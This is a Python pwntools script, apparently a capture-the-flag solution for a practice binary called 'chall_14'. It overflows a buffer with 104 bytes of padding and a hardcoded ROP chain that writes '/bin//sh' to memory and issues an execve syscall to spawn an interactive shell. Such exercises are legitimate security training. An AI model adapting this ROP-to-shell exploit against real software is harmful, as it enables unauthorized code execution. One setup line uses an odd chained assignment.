from pwn import *
from struct import pack

def main():
	binary = binary.context = ELF("./chall_14")
	p = process("./chall_14")

	payload = pack('<Q', 0x0000000000410263) # pop rsi ; ret
	payload += pack('<Q', 0x00000000006b90e0) # @ .data
	payload += pack('<Q', 0x00000000004158f4) # pop rax ; ret
	payload += b'/bin//sh'
	payload += pack('<Q', 0x000000000047f401) # mov qword ptr [rsi], rax ; ret
	payload += pack('<Q', 0x0000000000410263) # pop rsi ; ret
	payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	payload += pack('<Q', 0x0000000000444e50) # xor rax, rax ; ret
	payload += pack('<Q', 0x000000000047f401) # mov qword ptr [rsi], rax ; ret
	payload += pack('<Q', 0x0000000000400696) # pop rdi ; ret
	payload += pack('<Q', 0x00000000006b90e0) # @ .data
	payload += pack('<Q', 0x0000000000410263) # pop rsi ; ret
	payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	payload += pack('<Q', 0x0000000000449b15) # pop rdx ; ret
	payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	payload += pack('<Q', 0x0000000000444e50) # xor rax, rax ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
	payload += pack('<Q', 0x000000000040120c) # syscall
	
	p.recv()
	p.sendline()
	p.sendline((104 * "A").encode() + payload)
	p.interactive()

main()
